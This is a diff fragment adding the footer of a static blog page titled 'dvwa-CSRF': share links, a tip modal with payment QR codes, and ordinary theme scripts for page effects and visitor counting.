+        <span class="license">This blog is licensed under a <a rel="license" rel="external nofollow" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+    </div>
+</footer>
+
+    </main>
+    
+        
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        <span>感谢您的鼓励支持！</span>
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" data-img="/img/dog.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/weixin.png" data-alipay="/img/zhifubao.png">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechatPay">&nbsp;&nbsp;微信&nbsp;&nbsp;</span>
+                <span class="reward-toggle-item alipayPay">支付宝</span>
+            </div>
+        </label>
+        
+        <i class="icon icon-caret-up"></i>
+    </div>
+</div>
+
+
+    
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/48103/&title=《dvwa-CSRF》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/48103/&title=《dvwa-CSRF》 — Somnus's blog&source=总结了dvwa中关于跨网站请求伪造的一些关卡" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/48103/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《dvwa-CSRF》 — Somnus's blog&url=https://Foxgrin.github.io/posts/48103/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/48103/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p class="wechatshare">扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABx0lEQVR42u3ayw7CMAxE0f7/TxeJbWmYGTtWQTcrhEI47cLyI8chr/O9rp/dnfo5pQUXLtwy91yu6571b+/2K/S1AS5cuPNcJSTpIcw9TTHAhQv3mdwsiVkHLLhw4f4HV0lx1g8DFy7cX+EqxU+lELrbubFWgwsXboFbaZh2fR7q78KFC7c8lVDSFzfo6MHrw8lw4cId4dYLEr1ocUOYkZHBhQu3lZs1PtxgJ72zrjsgcOHCLXOVtCMbuLrDWsUAFy7cea4byJRURklc3AQLLly4u7kK0S2T3MtbxiAHLly4I1ydon+fXb8ISyC4cOFu4OoJijtW0YsfI2GCCxfuCDdrlbopUaVFK4UzuHDhbuDq9Cx4raENHR24cOFu4HaFG6VA0osf443ChQu3lVtpgrhtkWyIcntZEy5cuCPcDNrbeP1S/MCFC3eEm00u3PZo5TqXgYYLF24T9zRX1kjtGuvChQt3hpvlD5VGSXYmXLhw57lZ8ApnNWYga2uOwIULN+JmgUa/UOVGULhw4f4K1702kZVYX4ofuHDhPp6rJDeVRw3vjsGFC7eJWyl+stQnbLbChQt3hJsNXJWRqh7Osn+HCxfuBu4LM3ELCXb/EmoAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+
+
+    <!-- waves按钮特效 -->
+<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<!-- 主题配置脚本 -->
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+</script>
+
+<!-- jquery -->
+<script src="/js/jquery.min.js?v=3.0"></script>
+
+<!-- 搜索 -->
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item waves-block waves-effect" onclick="location.href='{path}'">
+    <div class="title ellipsis" title="{title}">{title}</div>
+</li>
+</template>
+
+
+<!-- main博客脚本 -->
+<script src="/js/main.min.js?v=3.0" ></script>
+
+<!-- 动画&配置 -->
+<script src="/js/script.min.js?v=3.0" ></script>
+
+<!-- 脚本管理 -->
+<script>
+
+if(window.innerWidth > 800){
+	/* 3D标题 */
+	$(".content-header").on("mousemove", threedee);
+
+	/* 底部追随鼠标 */
+	$(".footer").hover(2);
+
+	/* gotop键的涟漪 */
+	$("#gotop").hover(1);
+
+	/* 赞赏的粒子雨 */
+	$("#reward").hover(3);
+
+	/* 微信公众号的底部渲染 */
+	$("#wechat").hover(4);
+
+    /* 标题跳动 */
+    $(".archivestitle").bumpyText();
+
+	/* 图片点击放大 */
+	const postimg = jQuery(".post-content img:not(.github-emoji)");
+	postimg.on("click",function(){
+
+		mask.classList.add("in");
+		main.classList.add("Mask");
+		menu.classList.add("Mask");
+		var myimg = this.cloneNode(true);
+		myimg.classList.add("imgShow");
+
+		setTimeout(function(){
+			jQuery(myimg).animate({
+				opacity:"1"
+			},1000);
+		},0);
+
+		document.body.appendChild(myimg);
+
+		myimg.onclick=function(){
+			document.body.removeChild(myimg);
+			mask.classList.remove("in");
+			main.classList.remove("Mask");
+			menu.classList.remove("Mask");
+		};
+
+	});
+
+}
+
+/* 名字跳动 */
+$("#name").bumpyText();
+
+
+/* 网站运行时间 */
+setInterval(function () {
+	setTime("2018/7/9");
+}, 1000);
+
+/* 文章块的淡出 */
+postshow();
+
+/* 座右铭 */
+
+   getHitokoto();
+
+
+
+/* 粘贴提示 */
+G($(".post-content"), location.href, "Somnus");
+
+
+/* 控制台 */
+if (window.console && window.console.log) {
+	setTimeout(function () {
+		console.log("\n %c 一个坏掉的番茄 %c  © Simon Ma  http://tomotoes.com \n\n", "color:#FFFFFB;background:#1abc9c;padding:5px 0;border-radius:.5rem 0 0 .5rem;", "color:#FFFFFB;background:#080808;padding:5px 0;border-radius:0 .5rem .5rem 0;");
+	}, 0);
+}
+
+</script>
+
+
+
+
+<!-- 公式渲染 -->
+
+
+
+<!-- 不蒜子 -->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+</body>
+</html>
